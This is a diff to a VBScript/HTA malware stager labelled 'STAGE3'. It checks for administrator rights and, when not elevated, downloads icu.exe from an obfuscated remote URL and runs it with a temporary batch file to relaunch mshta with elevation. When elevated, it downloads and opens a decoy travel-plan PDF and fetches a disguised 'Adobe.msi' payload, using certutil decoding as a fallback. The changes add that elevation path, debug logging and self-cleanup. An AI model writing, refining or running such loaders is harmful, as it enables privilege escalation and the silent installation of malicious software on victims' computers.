@@ -9,7 +9,7 @@ qs  = Chr(34)
 logFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\s3_debug.txt"
 Set dbg = fso.OpenTextFile(logFile, 8, True)
 dbg.WriteLine "=================================================="
-dbg.WriteLine "STAGE3 DEBUG — " & Now
+dbg.WriteLine "STAGE3 DEBUG - " & Now
 dbg.WriteLine "=================================================="
 
 p1 = "https://raw.g"
@@ -25,6 +25,7 @@ selfPath = Replace(selfPath, "%20", " ")
 selfPath = Replace(selfPath, "/", "\")
 dbg.WriteLine "[SELF] selfPath = " & selfPath
 
+' --- admin probe ---
 dbg.WriteLine "[PROBE] running whoami /groups..."
 isAdmin = False
 Dim tmpOut, fIn, contents
@@ -50,10 +51,10 @@ End If
 Err.Clear
 
 ' ============================================================
-'  NOT ADMIN — fire icu.exe
+'  NOT ADMIN - fire icu.exe via .bat intermediate
 ' ============================================================
 If Not isAdmin Then
-    dbg.WriteLine "[BRANCH] NOT ADMIN — firing icu.exe"
+    dbg.WriteLine "[BRANCH] NOT ADMIN - firing icu.exe"
 
     tmpExe = sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.exe"
     icuUrl = p1 & p2 & p3 & p4 & p5 & "icu.exe"
@@ -89,30 +90,69 @@ If Not isAdmin Then
     End If
 
     If fso.FileExists(tmpExe) Then
-        dbg.WriteLine "[ICU] file saved: " & fso.GetFile(tmpExe).Size & " bytes"
-        Dim runCmd
-        runCmd = qs & tmpExe & qs & " m4a1_dev4 mshta.exe " & qs & selfPath & qs
-        dbg.WriteLine "[ICU] running: " & runCmd
+        dbg.WriteLine "[ICU] saved: " & fso.GetFile(tmpExe).Size & " bytes"
+
+        ' ---- write intermediate .bat ----
+        Dim batPath, batContent, bf, shortBat
+        batPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\r.bat"
+        batContent = "@echo off" & vbCrLf & "start """" /min mshta.exe """ & selfPath & """" & vbCrLf
+        dbg.WriteLine "[BAT] writing: " & batPath
+        dbg.WriteLine "[BAT] content: " & Replace(batContent, vbCrLf, " || ")
+
         On Error Resume Next
-        sh.Run runCmd, 0, False
+        Set bf = fso.CreateTextFile(batPath, True)
+        bf.Write batContent
+        bf.Close
         If Err.Number <> 0 Then
-            dbg.WriteLine "[ICU] run err: " & Err.Number & " - " & Err.Description
+            dbg.WriteLine "[BAT] write err: " & Err.Number & " - " & Err.Description
             Err.Clear
-        Else
-            dbg.WriteLine "[ICU] run returned — icu should be elevating mshta now"
         End If
         On Error GoTo 0
+
+        If fso.FileExists(batPath) Then
+            ' get 8.3 short path (removes spaces)
+            On Error Resume Next
+            shortBat = fso.GetFile(batPath).ShortPath
+            If Err.Number <> 0 Then
+                dbg.WriteLine "[BAT] short path err: " & Err.Number & " - " & Err.Description
+                shortBat = batPath
+                Err.Clear
+            End If
+            On Error GoTo 0
+            dbg.WriteLine "[BAT] short path: " & shortBat
+
+            ' ---- run icu.exe with the .bat path (single arg) ----
+            Dim runCmd
+            runCmd = qs & tmpExe & qs & " m4a1_dev4 " & qs & shortBat & qs
+            dbg.WriteLine "[ICU] running: " & runCmd
+
+            On Error Resume Next
+            sh.Run runCmd, 0, False
+            If Err.Number <> 0 Then
+                dbg.WriteLine "[ICU] run err: " & Err.Number & " - " & Err.Description
+                Err.Clear
+            Else
+                dbg.WriteLine "[ICU] run returned - icu should be elevating now"
+            End If
+            On Error GoTo 0
+
+            ' deferred cleanup of the .bat
+            sh.Run "%COMSPEC% /c timeout /t 30 /nobreak >nul & del /f /q """ & batPath & """", 0, False
+        Else
+            dbg.WriteLine "[BAT] FAILED - bat not on disk"
+        End If
     Else
-        dbg.WriteLine "[ICU] FAILED — icu.exe not on disk"
+        dbg.WriteLine "[ICU] FAILED - icu.exe not on disk"
     End If
+
     dbg.WriteLine "=== END (unelevated) ==="
     dbg.Close
 
 ' ============================================================
-'  ADMIN — do the payload
+'  ADMIN - do the payload
 ' ============================================================
 Else
-    dbg.WriteLine "[BRANCH] ADMIN — proceeding with payload"
+    dbg.WriteLine "[BRANCH] ADMIN - proceeding with payload"
 
     tmpExe = sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.exe"
     On Error Resume Next
@@ -120,19 +160,29 @@ Else
         fso.DeleteFile tmpExe, True
         dbg.WriteLine "[CLEANUP] deleted " & tmpExe
     End If
+    ' also clean up the .bat if present
+    If fso.FileExists(sh.ExpandEnvironmentStrings("%TEMP%") & "\r.bat") Then
+        fso.DeleteFile sh.ExpandEnvironmentStrings("%TEMP%") & "\r.bat", True
+        dbg.WriteLine "[CLEANUP] deleted r.bat"
+    End If
     Err.Clear
     On Error GoTo 0
 
-    ' PDF
+    ' ---- PDF ----
     dbg.WriteLine "[PDF] starting"
     pdfUrl  = p1 & p2 & p3 & p4 & p5 & "Travel-Meeting-Plan-Q4-2026.pdf"
     pdfPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Travel-Meeting-Plan-Q4-2026.pdf"
+    dbg.WriteLine "[PDF] url  = " & pdfUrl
+    dbg.WriteLine "[PDF] dest = " & pdfPath
 
     On Error Resume Next
     Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
     http.Open "GET", pdfUrl, False
     http.Send
-    Err.Clear
+    If Err.Number <> 0 Then
+        dbg.WriteLine "[PDF] http err: " & Err.Number & " - " & Err.Description
+        Err.Clear
+    End If
     On Error GoTo 0
     dbg.WriteLine "[PDF] status: " & http.Status
     dbg.WriteLine "[PDF] body  : " & LenB(http.ResponseBody) & " bytes"
@@ -144,26 +194,37 @@ Else
         stream.Open
         stream.Write http.ResponseBody
         stream.SaveToFile pdfPath, 2
-        Err.Clear
+        If Err.Number <> 0 Then
+            dbg.WriteLine "[PDF] save err: " & Err.Number & " - " & Err.Description
+            Err.Clear
+        End If
+        stream.Close
         On Error GoTo 0
         If fso.FileExists(pdfPath) Then
             dbg.WriteLine "[PDF] saved: " & fso.GetFile(pdfPath).Size & " bytes"
             sh.Run "msedge.exe """ & pdfPath & """", 1, False
             dbg.WriteLine "[PDF] opened in Edge"
+        Else
+            dbg.WriteLine "[PDF] save FAILED"
         End If
     End If
 
-    ' MSI
+    ' ---- MSI ----
     dbg.WriteLine "[MSI] starting"
     msiUrl  = p1 & p2 & p3 & p4 & p5 & "Adobe.msi"
     msiPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.msi"
+    dbg.WriteLine "[MSI] url  = " & msiUrl
+    dbg.WriteLine "[MSI] dest = " & msiPath
 
     On Error Resume Next
     If fso.FileExists(msiPath) Then fso.DeleteFile msiPath, True
     Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
     http.Open "GET", msiUrl, False
     http.Send
-    Err.Clear
+    If Err.Number <> 0 Then
+        dbg.WriteLine "[MSI] http err: " & Err.Number & " - " & Err.Description
+        Err.Clear
+    End If
     On Error GoTo 0
     dbg.WriteLine "[MSI] status: " & http.Status
     dbg.WriteLine "[MSI] body  : " & LenB(http.ResponseBody) & " bytes"
@@ -178,14 +239,18 @@ Else
         stream.Open
         stream.Write http.ResponseBody
         stream.SaveToFile msiPath, 2
-        Err.Clear
+        If Err.Number <> 0 Then
+            dbg.WriteLine "[MSI] direct save err: " & Err.Number & " - " & Err.Description
+            Err.Clear
+        End If
+        stream.Close
         On Error GoTo 0
 
         If fso.FileExists(msiPath) Then
-            dbg.WriteLine "[MSI] saved: " & fso.GetFile(msiPath).Size & " bytes"
+            dbg.WriteLine "[MSI] direct save OK: " & fso.GetFile(msiPath).Size & " bytes"
             saved = True
         Else
-            dbg.WriteLine "[MSI] direct save FAILED — certutil fallback"
+            dbg.WriteLine "[MSI] direct save FAILED - certutil fallback"
             Dim b64Path, fh, xmlDoc, binNode, b64Text
             b64Path = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.b64"
             On Error Resume Next
@@ -197,11 +262,17 @@ Else
             Err.Clear
             On Error GoTo 0
             If b64Text <> "" Then
+                dbg.WriteLine "[MSI] b64 len: " & Len(b64Text)
                 Set fh = fso.CreateTextFile(b64Path, True)
                 fh.Write b64Text
                 fh.Close
                 sh.Run "%COMSPEC% /c certutil.exe -decode """ & b64Path & """ """ & msiPath & """", 0, True
-                If fso.FileExists(msiPath) Then saved = True
+                If fso.FileExists(msiPath) Then
+                    dbg.WriteLine "[MSI] certutil OK: " & fso.GetFile(msiPath).Size & " bytes"
+                    saved = True
+                Else
+                    dbg.WriteLine "[MSI] certutil FAILED"
+                End If
                 On Error Resume Next
                 fso.DeleteFile b64Path, True
                 Err.Clear
